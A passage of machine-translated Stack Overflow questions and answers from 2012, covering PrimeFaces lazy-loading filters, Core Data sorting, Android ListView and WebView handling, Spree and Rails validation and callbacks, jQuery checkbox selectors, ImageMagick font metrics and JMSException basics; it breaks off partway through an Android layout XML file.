public List<Ciatt001> load(int startingAt, int maxPerPage, String sortField, SortOrder sortOrder, Map<String, String> filters) {
    String a = "";
    try {   
    listaClientes = new ArrayList<Ciatt001>();
    a = String.valueOf(agendamientoSession.countClientes2(cia, age));
    listaClientes = agendamientoSession.listaClientes2(cia, age, startingAt, maxPerPage);
    } catch (Exception e) {
        e.printStackTrace();
    }

    if (getRowCount() <= 0) {
      setRowCount(Integer.parseInt(a));
     }
    setPageSize(maxPerPage);
     return listaClientes;  
    }

@Override
public Object getRowKey(Ciatt001 ciatt001) {
    return ciatt001.getClDocid();
}

@Override
public Ciatt001 getRowData(String docid) {
    //Integer id = Integer.valueOf(idBandeja);

    for (Ciatt001 ciatt001 : listaClientes) {
        if (docid.equals(ciatt001.getClDocid())) {
            return ciatt001;
        }
    }

    return null;
} 
```

和 ejb 方法：

```
 public List<Ciatt001> listaClientes2(String cia, String age  ,int startingAt, int maxPerPage) {

    Query query = em.createNamedQuery("Ciatt001.listaClientesPorCiaPorAge2");
    query.setParameter(1, cia);
    query.setParameter(2, age);
    query.setFirstResult(startingAt);
    query.setMaxResults(maxPerPage);
    return query.getResultList();
}
    public String countClientes2(String cia, String age) {

    Query query = em.createNamedQuery("Ciatt001.countClientes2");
    query.setParameter(1, cia);
    query.setParameter(2, age);     
    return query.getSingleResult().toString();
} 
```

如何使用此延迟加载实现实现全局过滤器？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T00:37:05.003

在加载功能上，获取过滤器值（检查是否不为空）。

```
String filterValue = filters.get("globalFilter"); 
```

然后，如果您没有使用任何其他过滤器，请使用析取 (OR) 进行查询：

```
"select * from table where x = ? OR y = ?" //replace ? for globalFilter value 
```

如果您使用其他字段，您应该这样做：

```
//normal filters 
filtersCondition  = "(x = ? AND y = ?)" //replace ? for filters values
//global filters
globalFilterCondition = "(x = globalFilter OR y = globalFilter)" //replace ? for globalFilter value
//normal filters + global filter
query = "select * from table where " +filtersCondition+ " AND "+ globalFilterCondition 
```

当然，这个查询只是一个例子，你应该构建一个很好的并且参数化的 =)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T22:50:58.337

这就是我如何让它工作，分页和过滤：D

LazyDataModel 现在看起来像这样：

在加载方法中：

```
 Set set = filters.entrySet();
       Iterator i = set.iterator();
       if (i.hasNext()) {
            Map.Entry me = (Map.Entry) i.next();
            filterValue = (String) me.getValue();
        }
        a = String.valueOf(agendamientoSession.countClientes2(cia, age, filterValue));
        listaClientes = agendamientoSession.listaClientes2(cia, age, startingAt, maxPerPage, filterValue);
        setRowCount(Integer.parseInt(a)); 
```

ejb：

```
 public List<Ciatt001> listaClientes2(String cia, String age  ,int startingAt, int maxPerPage,String filtro)      {
    Query query = em.createNamedQuery("Ciatt001.listaClientesPorCiaPorAge2");
    query.setParameter(1, cia);
    query.setParameter(2, age);
    query.setParameter(3,"%"+filtro+"%");
    query.setParameter(4,"%"+filtro+"%");
    query.setFirstResult(startingAt);
    query.setMaxResults(maxPerPage);
    } 
```

和我的查询：

```
 select *  from ciatt001 c where c.cl_co_cia=? and c.cl_ag_agencia =?
  and c.cl_estado='A' and (c.cl_docid like ? or c.cl_nombre1 like ? .. more filters if needed) 
```

就是这样，现在将寻找排序实现：D

# ios - 选择性获取中的排序 - 核心数据

> ID：11235958
> 
> 赞同：2
> 
> 时间：2012-06-27T23:01:07.390
> 
> 标签：ios, core-data, nsfetchrequest

我正在寻找使用 NSPredicate 和 NSSortDescriptor 获取存储在我的核心数据模型中的一些对象：

```
NSPredicate *predicate = [NSPredicate
                          predicateWithFormat:@"myObjectList.objectID like %@", objectID];
NSSortDescriptor *sort = [NSSortDescriptor 
                          sortDescriptorWithKey:@"sortKey" ascending:NO];
NSFetchRequest *fetch = [MyObject fetchRequest];
[fetch setPredicate:predicate];
[fetch setSortDescriptors:[NSArray arrayWithObject:sort]];
[fetch setFetchLimit: n];
NSArray *results = [MyObject objectWithFetchRequest:fetch];
return results; 
```

我想知道是否有人已经知道是否给定了 fetchLimit `n`：

*   排序应用于`myObjectList`匹配中的所有实体，`objectID`第一个`n`返回在`results`?

*   从中获取第一个`n`匹配的实体，然后对这个子组进行排序，很可能导致排序不准确？`objectID``myObjectList``MyObjects`

基本上我想知道我是否可以在不将它们全部拉出进行排序的情况下获取一组有序的项目。期待您的回复！

# java - OnClickListener 用于从 listview 行启动 webview

> ID：11235960
> 
> 赞同：0
> 
> 时间：2012-06-27T23:01:31.537
> 
> 标签：java, android

搜索 api 正在向我返回一些元数据以及 URL“eventURL”。我将数据放在列表视图中，每一行都包含一些数据和一个唯一的 URL。我希望当用户点击列表视图中的行时，该唯一的 URL 应该在 webview 中打开。我已经为它创建了一个 WebViewActivity，我在实现 onClickListener 时遇到问题。

**主要活动**

```
public class MainActivity extends Activity {

//private EditText m_search_text;
private EditText m_zip;
private ListView m_search_results;
private Button m_search_btn;
private JSONArray m_results; 
private LayoutInflater m_inflater;
private InputMethodManager m_ctrl;
private Spinner m_radius;
private Spinner m_activity_selector;
public static int radius = 0;
public static String activities;

static final private int EXIT_ID = Menu.FIRST;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.main);
   // m_search_text = (EditText) findViewById(R.id.search_text);
    m_zip = (EditText) findViewById(R.id.zip);
    m_search_btn = (Button) findViewById(R.id.search_button);
   // m_search_results = (ListView) findViewById(R.id.lview);
    m_search_btn .setOnClickListener(go_handler);

    m_ctrl = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
    m_inflater = LayoutInflater.from(this);
    addListenerOnSpinnerItemSelection();
    addListenerOnSpinner1ItemSelection();

  m_search_results = (ListView)findViewById(R.id.lview);

}

public void addListenerOnSpinnerItemSelection() {
    m_radius = (Spinner) findViewById(R.id.spinner);
    m_radius.setOnItemSelectedListener(new CustomOnItemSelectedListener());
  }

public void addListenerOnSpinner1ItemSelection(){
    m_activity_selector = (Spinner) findViewById(R.id.spinner1);
    m_activity_selector.setOnItemSelectedListener(new ActivitySelectedListener());
    }

@Override
public boolean onCreateOptionsMenu(Menu menu){
    super.onCreateOptionsMenu(menu);

    menu.add(0, EXIT_ID, 0, R.string.exit);
    return true;
    }
@Override
public boolean onOptionsItemSelected (MenuItem item){

    switch (item.getItemId()){
    case EXIT_ID:
        finish();
        return true;

    }

    return super.onOptionsItemSelected(item);

}

OnClickListener go_handler = new OnClickListener() {

    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub
        m_ctrl.hideSoftInputFromWindow(m_zip.getWindowToken(), 0);

        //String searchText = Uri.encode(m_search_text.getText().toString());
        String zip = Uri.encode(m_zip.getText().toString());

        new SearchTask().execute("?k=Fall+Classic" + "&m=meta:channel=" + activities + "&l="+ zip + "&r=" + radius);
        // Show a toast showing the search text
        Toast.makeText(getApplicationContext(),
                getString(R.string.search_msg) + " " + 
                activities, Toast.LENGTH_LONG).show();
    }
};

private class SearchTask extends AsyncTask<String, Integer, String>
{

    ProgressDialog dialog;

        @Override
        protected void onPreExecute() {

            dialog = ProgressDialog.show(MainActivity.this,"","Please Wait...");

            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... params) {
            try {
                String result = ActiveHelper.download(params [0]);
                return result;
            } catch (ApiException e) {
                e.printStackTrace();
                Log.e("alatta", "Problem making search request");
            }
            return "";
        }
        @Override
        protected void onPostExecute(String result) {
            dialog.hide();
            try {
                JSONObject obj = new JSONObject(result);
                m_results = obj.getJSONArray("_results");
                if (m_results == null ||m_results.length() == 0)
                {
                    Toast.makeText(getApplicationContext(),
                            "No Results found for " + activities, 
                            Toast.LENGTH_LONG).show();

                }
                else
                    m_search_results.setAdapter(new JSONAdapter(getApplicationContext()));
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

private class JSONAdapter extends BaseAdapter
{
    public JSONAdapter(Context c){

    }

    public int getCount() 
    {
    return  m_results.length();
        }

    public Object getItem(int arg0){
        return null;
    }

    public long getItemId(int pos){
        return pos;

    }

    public View getView(int pos, View convertView, ViewGroup parent) {
        View tv;
        TextView t;

        if (convertView == null)
            tv = m_inflater.inflate (R.layout.item, parent, false);
        else
            tv = convertView;
        try {
            /* For each entry in the ListView, we need to populate 
             * its text and timestamp */
            t = (TextView) tv.findViewById(R.id.text);
            JSONObject obj = m_results.getJSONObject(pos);

            t.setText (obj.getString("title").replaceAll("\\<.*?\\>", ""));

            t = (TextView) tv.findViewById(R.id.created_at);
            JSONObject meta = obj.getJSONObject("meta");
            t.setText ("When:" + "\t"+meta.getString("startDate")+"\n"+"Location:" +"\t" +meta.getString("location")+"\n" +"More Info:"+"\t" +meta.getString("eventURL")+"\n");

        } catch (JSONException e) {

            Log.e("alatta", e.getMessage());
        }
        return tv;
    }
}} 
```

**WebViewActivity**

公共类 WebViewActivity 扩展 MainActivity {

```
 private WebView webView;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.webview);

        webView = (WebView) findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("url");

    }} 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:11:20.140

您需要使用 OnItemClickListener：

```
MainActivity implements OnItemClickListener {

onCreate() {
m_search_results.setOnItemClickListener(this); 
```

制作这个方法：

```
onItemClick(AdapterView<?> parent, View view, int position, long id) {

url = JSON.getHowever(position);

//get the intent, load the url, and launch the activity

} 
```

您还需要在 WebViewActivity 中处理意图，但这不是问题所在

# ruby-on-rails - 狂欢验证字段

> ID：11235961
> 
> 赞同：0
> 
> 时间：2012-06-27T23:01:32.710
> 
> 标签：ruby-on-rails, spree

我正在将 Spree 用于电子商务应用程序，并且正在尝试验证 sku 的唯一性

```
Spree::Variant.class_eval do
  attr_accessible :sku
  validates_uniqueness_of :sku
end 
```

然后，当我想创建新记录时，出现此错误：

```
undefined method `price' for nil:NilClass
Extracted source (around line #7):

4: <% content_for :sidebar do %>
5: 
6:   <h3>
7: <%= @product.name %><span class="sku"><%= @product.sku %></span>
8: </h3>
9:   <br class="clear"><ul class="sidebar product-menu" data-hook="admin_product_tabs">
10: <li <%== ' class="active"' if current == 'Product Details' %>> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T10:07:38.890

将近一年后...您需要在模型中编写一个自定义验证，如下所示

```
validate :validate_sku, :on => :create
private
        def validate_sku
        if Spree::Variant.exists?(:sku => sku)
            errors.add(:sku, "SKU kod je již používán")
        end
    end 
```

# jquery - JQuery 将点击事件绑定到复选框

> ID：11235966
> 
> 赞同：11
> 
> 时间：2012-06-27T23:02:14.327
> 
> 标签：jquery, bind

这是我的 html 的基本视图：

```
<form>
  <div id="part1">
     // some html form elements including checkboxes
  </div>
  <div id="part2">
    // more html code with more checkboxes
  </div>
  <div id=part2">
     // data table with numerous checkboxes built dynamically
  </div
</form> 
```

我需要做的是将`.click()`事件分别绑定到第 1、2 和 3 部分中的复选框。我试过这个`$('#part1:checkbox').click(...)`，但没有奏效。如果我使用`$("form :checkbox").click(...)`相同的点击事件绑定到所有复选框而不仅仅是一组。我将如何分开这些？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-27T23:04:55.437

您快到了。您只需要一个空格来分隔后代选择器：

```
$('#part1 :checkbox').click(function(){
    // code goes here
}); 
```

为了提高性能，你可能想使用这个：

```
$('#part1 input[type=checkbox]').click(function(){
    // code goes here
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-19T06:59:39.810

或者您为所有复选框提供相同的类名并为复选框提供相应的 div ID，因此您可以使用以下代码，

```
<input type="checkbox" class="checkall" id="part1">Part 1 
```

你的脚本是这样的。

```
$('.checkall').click(function () {
if (this.checked == false) {
$("." + $(this).attr("id")).hide();
}
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-12-13T15:01:55.207

我有一个类似的问题，这个 StackOverflow 页面是我偶然发现的第一个答案，但对它并不满意。我发现这篇文章[https://www.kevinleary.net/jquery-checkbox-checked/](https://www.kevinleary.net/jquery-checkbox-checked/)有更好的解决方案。

```
$('input[name="subscribe"]').on('click', function(){
    if ( $(this).is(':checked') ) {
        $('input[name="email"]').show();
    } 
    else {
        $('input[name="email"]').hide();
    }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T23:06:41.830

用这个：

```
$('#part1 input:checkbox').click(...) 
```

[http://api.jquery.com/checkbox-selector/](http://api.jquery.com/checkbox-selector/)

# ruby-on-rails - 使用 JS 调用 update_all 方法时 after_update 未触发

> ID：11235968
> 
> 赞同：0
> 
> 时间：2012-06-27T23:02:20.393
> 
> 标签：ruby-on-rails, activerecord

我正在使用 JS 排序来调用这个方法：

```
def sort
    params[:piece].each_with_index do |id, index|
      current_user.lineup.piece_lineups.update_all({position: index+1}, {piece_id: id})
    end
    render nothing: true
  end 
```

在我的piece_lineup 模型中，我有：

```
after_update :update_associated_lineup 
```

但是它不会被 update_all 调用触发。难道我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T01:36:50.090

`update_all`方法生成一个 SQL UPDATE 查询，仅此而已。它不会实例化任何 ActiveRecord 对象，因此不会触发验证或回调。要触发回调，您必须执行类似的操作

```
piece_lineups = current_user.lineup.piece_lineups

params[:piece].each_with_index do |id, index|
  piece_lineups.
    select { |pl| pl.piece_id == id }.
    map { |pl| pl.update_attribute(:position, index + 1) }
end 
```

# imagemagick - ImageMagick 函数 queryFontMetrics 的结果不准确

> ID：11235969
> 
> 赞同：1
> 
> 时间：2012-06-27T23:02:33.343
> 
> 标签：imagemagick

Imagick::queryFontMetrics 似乎没有工作。当我使用 queryFontMetrics 提供的指标来调整图像大小时，一些字体仍然被截断。有任何想法吗？

这是我的代码：

```
if (!file_exists($cache['dirname'].'/'.$cache['basename'])) {

try {
    $draw = new ImagickDraw();
    $draw->setFont($font_path['dirname'].'/'.$font_path['basename']);
    $draw->setFontSize($size);
    $draw->setGravity(Imagick::GRAVITY_CENTER);
    $draw->setFillColor($color);

    $canvas = new Imagick();

    $metrics = $canvas->queryFontMetrics($draw, $text);

    $canvas->newImage($metrics['textWidth'], $metrics['textHeight'], "transparent", "png");
    $canvas->annotateImage($draw, 0, 0, 0, $text);

    $canvas->setImageFormat('PNG');
    mkdir($cache['dirname'], 0777, true);
    $canvas->writeImage($cache['dirname'].'/'.$cache['basename']);

    header("Content-Type: image/png");
    echo $canvas;

    $canvas->clear();
    $canvas->destroy();

    $draw->clear();
    $draw->destroy();

} catch(Exception $e) {
    // Output an error message
    echo 'Error: ',  $e->getMessage(), "";
}

} else {
    // Output the image
    $canvas = new Imagick($cache['dirname'].'/'.$cache['basename']);
    header("Content-Type: image/png");
    echo $canvas;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T03:15:10.120

好的，看来我会自己回答这个问题。经过相当多的研究，我发现从字体本身获得正确的指标基本上是不可能的。这是因为每个字体设计师都可能以不同的方式定义指标。最好的方法是简单地使图像比需要*的大得多*（以确保不会发生剪辑），然后使用修剪命令：[http](http://www.php.net/manual/en/imagick.trimimage.php) ://www.php.net/manual/en/imagick.trimimage.php 。

# java - 我不知道 JMSExceptions 是什么，以及如何处理它们。有人可以向我解释一下吗？

> ID：11235972
> 
> 赞同：1
> 
> 时间：2012-06-27T23:03:01.897
> 
> 标签：java, exception-handling, jms

我是一名 Java 初学者，我不太确定 JMSExceptions 是什么以及它们的作用，我查找的所有内容似乎都深入到让我掌握它的真正含义。我所知道的是它与 API 有关。

有人可以简单地向我解释它是什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T23:15:49.527

JMSException是 Java 消息服务 (JMS) 包 API 在需要将异常传达给 JMS 包的使用者时抛出的基本类型（从 Exception 派生）[。](http://docs.oracle.com/javaee/1.4/api/javax/jms/JMSException.html)

如果您不知道如何在 Java 中进行异常处理，那么[Sun 的这篇教程](http://docs.oracle.com/javase/tutorial/essential/exceptions/)可能是一个好的开始。

这里有关于如何使用 JMS API 以及如何捕获 JMSExceptions 的很好的示例[-](http://www.novell.com/documentation/extend52/Docs/help/MP/jms/tutorial/pubSub-1.htm)突出的部分是：

```
/**
   This method is called asynchronously by JMS when a message arrives
   at the topic. Client applications must not throw any exceptions in
   the onMessage method.
   @param message A JMS message.
 */
public void onMessage(Message message)
{
    TextMessage msg = (TextMessage) message;
    try {
        System.out.println("received: " + msg.getText());
    } catch (JMSException ex) {
        ex.printStackTrace();
    }
}

/**
   This method is called asynchronously by JMS when some error occurs.
   When using an asynchronous message listener it is recommended to use
   an exception listener also since JMS have no way to report errors
   otherwise.
   @param exception A JMS exception.
 */
public void onException(JMSException exception)
{
    System.err.println("something bad happended: " + exception);
} 
```

# android - 用于更改 main.xml 上的 imageview 的按钮（android）

> ID：11235973
> 
> 赞同：0
> 
> 时间：2012-06-27T23:03:02.363
> 
> 标签：android, android-layout

（我的第一篇文章，顺便说一句）

我的问题太像新手了，我找不到任何人问过它，哦，我试过了。所以这里..：

我的主屏幕有一个图像视图。单击它，它会将您发送到不同的布局，从中可以选择一堆图像（图像按钮）（工作正常）。

按下这些图像按钮中的任何一个都应该将该图像发送到我的主图像视图（崩溃）

我在 ImButtons 所在的这个布局中创建了一个图像视图，并将图像发送到那里。这工作正常，所以 switch 语句没问题。

我试图在我的 main.java 中将我的主图像视图设为“公共”，但仍然崩溃。

所以问题是： *如何将图像从一个布局/类发送到另一个？*

提前感谢。

雅各布

一些代码：

我的二级布局：

```
package egen.helt.min;

import android.app.Activity;``
import android.media.MediaPlayer;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageButton;
import android.widget.ImageView;

public class FartSelect extends Activity implements OnClickListener {

    public ImageView VælgMax;
    MediaPlayer mpButtonClick;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.fartselect);

        VælgMax = (ImageView) findViewById(R.id.ivValgtMax);
        ImageButton skilt30 = (ImageButton) findViewById(R.id.ib30s);
        ImageButton skilt40 = (ImageButton) findViewById(R.id.ib40s);
        ImageButton skilt50 = (ImageButton) findViewById(R.id.ib50s);
        ImageButton skilt60 = (ImageButton) findViewById(R.id.ib60s);
        ImageButton skilt70 = (ImageButton) findViewById(R.id.ib70s);
        ImageButton skilt80 = (ImageButton) findViewById(R.id.ib80s);
        ImageButton skilt90 = (ImageButton) findViewById(R.id.ib90s);
        ImageButton skilt100 = (ImageButton) findViewById(R.id.ib100s);
        ImageButton skilt110 = (ImageButton) findViewById(R.id.ib110s);
        ImageButton skilt120 = (ImageButton) findViewById(R.id.ib120s);
        ImageButton skilt130 = (ImageButton) findViewById(R.id.ib130s);

        skilt30.setOnClickListener(this);
        skilt40.setOnClickListener(this);
        skilt50.setOnClickListener(this);``
        skilt60.setOnClickListener(this);
        skilt70.setOnClickListener(this);
        skilt80.setOnClickListener(this);
        skilt90.setOnClickListener(this);
        skilt100.setOnClickListener(this);
        skilt110.setOnClickListener(this);
        skilt120.setOnClickListener(this);
        skilt130.setOnClickListener(this);

    }

    public void onClick(View v) {
        // TODO Auto-generated method stub

        switch (v.getId()) {
        case R.id.ib30s:
            VælgMax.setImageResource(R.drawable.skilt30s);
            break;
        case R.id.ib40s:
            VælgMax.setImageResource(R.drawable.skilt40s);
            break;
        case R.id.ib50s:
            VælgMax.setImageResource(R.drawable.skilt50s);
            break;
        case R.id.ib60s:
            VælgMax.setImageResource(R.drawable.skilt60s);
            break;
        case R.id.ib70s:
            VælgMax.setImageResource(R.drawable.skilt70s);
            break;
        case R.id.ib80s:
            VælgMax.setImageResource(R.drawable.skilt80s);
            break;
        case R.id.ib90s:
            VælgMax.setImageResource(R.drawable.skilt90s);
            break;
        case R.id.ib100s:
            VælgMax.setImageResource(R.drawable.skilt100s);
            break;
        case R.id.ib110s:
            VælgMax.setImageResource(R.drawable.skilt110s);
            break;
        case R.id.ib120s:
            VælgMax.setImageResource(R.drawable.skilt120s);
            break;
        case R.id.ib130s:
            VælgMax.setImageResource(R.drawable.skilt130s);
            break;

        }

    }
} 
```

这里是 FartSelect.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/ivValgteMax"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:src="@drawable/blanktskiltsk" />

    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="400dp" >

        <LinearLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:gravity="center"
            android:orientation="vertical" >

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib30s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt30s" />

                <ImageButton
                    android:id="@+id/ib40s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt40s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib50s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt50s" />

                <ImageButton
                    android:id="@+id/ib60s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt60s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib70s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt70s" />

                <ImageButton
                    android:id="@+id/ib80s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt80s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib90s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt90s" />

                <ImageButton
                    android:id="@+id/ib100s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt100s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib110s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt110s" />

                <ImageButton
                    android:id="@+id/ib120s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt120s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib130s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt130s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib30sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt30sk" />

                <ImageButton
                    android:id="@+id/ib40sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:background="@android:color/black"
                    android:gravity="center"
                    android:src="@drawable/skilt40sk" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib50sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt50sk" />

                <ImageButton
                    android:id="@+id/ib60sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt60sk" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib70sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt70sk" />

                <ImageButton
                    android:id="@+id/ib80sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt80sk" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib90sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt90sk" />

                <ImageButton
                    android:id="@+id/ib100sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt100sk" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib110sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt110sk" />

                <ImageButton
                    android:id="@+id/ib120sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt120sk" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib130sk"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt130sk" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib30"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt30" />

                <ImageButton
                    android:id="@+id/ib40"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt40" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib50"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt50" />

                <ImageButton
                    android:id="@+id/ib60"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt60" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib70"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt70" />

                <ImageButton
                    android:id="@+id/ib80"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt80" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib90"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt90" />

                <ImageButton
                    android:id="@+id/ib100"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt100" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib110"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt110" />

                <ImageButton
                    android:id="@+id/ib120"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt120" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:orientation="horizontal" >

                <ImageButton
                    android:id="@+id/ib130"
                    android:layout_width="wrap_content"
